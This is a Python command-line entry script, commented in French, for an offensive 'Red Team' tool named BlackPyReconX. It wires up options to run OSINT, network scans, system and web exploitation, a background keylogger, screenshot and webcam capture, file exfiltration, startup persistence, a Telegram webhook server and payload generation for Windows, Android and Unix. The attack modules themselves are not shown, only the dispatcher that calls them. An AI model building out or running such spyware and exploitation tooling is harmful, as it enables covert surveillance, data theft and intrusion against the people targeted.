import argparse
import sys
import os
import threading
import subprocess

# ✅ Import des modules Red Team
from modules.osint import osint_main
from modules.scanner import scan_main
from modules.exfiltration import exfiltrate_all, exfiltrate_path
from modules.exploit_sys import (
    start_keylogger, take_screenshot, capture_webcam,
    exploit_system
)
from modules.reporting import generate_report
from modules.persistence import add_startup
from modules.utils import banner

# ✅ Ajout : import du module d'exploitation web
from modules.exploit_web import run as exploit_web_run

# ✅ Flask pour webhook Telegram
try:
    from telegram_bot.telegram_bot import app as telegram_app
except ImportError as e:
    print(f"⚠️ Bot Telegram non importé : {e}")
    telegram_app = None

# ✅ Répertoire racine
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

def run_cli():
    banner()

    parser = argparse.ArgumentParser(description="🕷️ BlackPyReconX - Red Team CLI")
    parser.add_argument("--target", help="Cible IP ou domaine")

    # Modules Red Team
    parser.add_argument("--osint", action="store_true", help="Effectuer un OSINT")
    parser.add_argument("--scan", action="store_true", help="Scan réseau")
    parser.add_argument("--exploit_sys", action="store_true", help="Exploitation système")
    parser.add_argument("--exploit_web", action="store_true", help="Exploitation web")  # ✅ Ajout ici
    parser.add_argument("--keylogger", action="store_true", help="Lancer le keylogger")
    parser.add_argument("--screenshot", action="store_true", help="Capture d'écran")
    parser.add_argument("--webcam", action="store_true", help="Capture webcam")
    parser.add_argument("--exfil", action="store_true", help="Exfiltration générale")
    parser.add_argument("--exfiltrate_path", help="Exfiltration d'un chemin spécifique")
    parser.add_argument("--report", action="store_true", help="Génération de rapport final")
    parser.add_argument("--webserver", action="store_true", help="Lancer le serveur Flask (Webhook Telegram)")
    parser.add_argument("--persist", action="store_true", help="Ajoute la persistance au démarrage")

    # Génération de payload
    parser.add_argument("--set_payload", choices=["windows", "android", "unix"],
                        help="Génère un payload pour la plateforme choisie")

    args = parser.parse_args()

    try:
        if args.osint:
            if not args.target:
                print("❌ Cible requise avec --target pour OSINT")
                return
            osint_main(args.target)
            print("✅ OSINT terminé.")

        elif args.scan:
            if not args.target:
                print("❌ Cible requise avec --target pour scan")
                return
            scan_main(args.target)
            print("✅ Scan réseau terminé.")

        elif args.exploit_sys:
            if not args.target:
                print("❌ IP cible requise avec --target pour exploitation")
                return
            exploit_system(args.target)
            print("✅ Exploitation système terminée.")

        elif args.exploit_web:
            if not args.target:
                print("❌ Cible requise avec --target pour exploitation web")
                return
            exploit_web_run(args.target)
            print("🌐 Exploitation Web terminée.")

        elif args.keylogger:
            print("⌨️ Keylogger lancé en arrière-plan.")
            threading.Thread(target=start_keylogger, daemon=True).start()

        elif args.screenshot:
            take_screenshot()
            print("📸 Capture d’écran enregistrée.")

        elif args.webcam:
            capture_webcam()
            print("📷 Capture webcam enregistrée.")

        elif args.exfil:
            exfiltrate_all()
            print("📤 Exfiltration générale terminée.")

        elif args.exfiltrate_path:
            exfiltrate_path(args.exfiltrate_path)
            print(f"📂 Exfiltration de {args.exfiltrate_path} terminée.")

        elif args.report:
            generate_report()
            print("📄 Rapport final généré.")

        elif args.webserver:
            if telegram_app:
                print("🚀 Serveur Flask lancé (Webhook Telegram)")
                telegram_app.run(host="0.0.0.0", port=10000, debug=False)
            else:
                print("❌ Bot Telegram indisponible.")

        elif args.persist:
            add_startup()
            print("🔒 Persistance configurée pour ce script.")

        elif args.set_payload:
            print(f"⚙️ Génération du payload pour {args.set_payload}...")
            subprocess.run([sys.executable, "build/packager.py", "--target", args.set_payload], check=True)

        else:
            parser.print_help()

    except KeyboardInterrupt:
        print("\n🛑 Interruption utilisateur.")
    except Exception as e:
        print(f"❌ Erreur critique : {e}")

if __name__ == "__main__":
    run_cli()
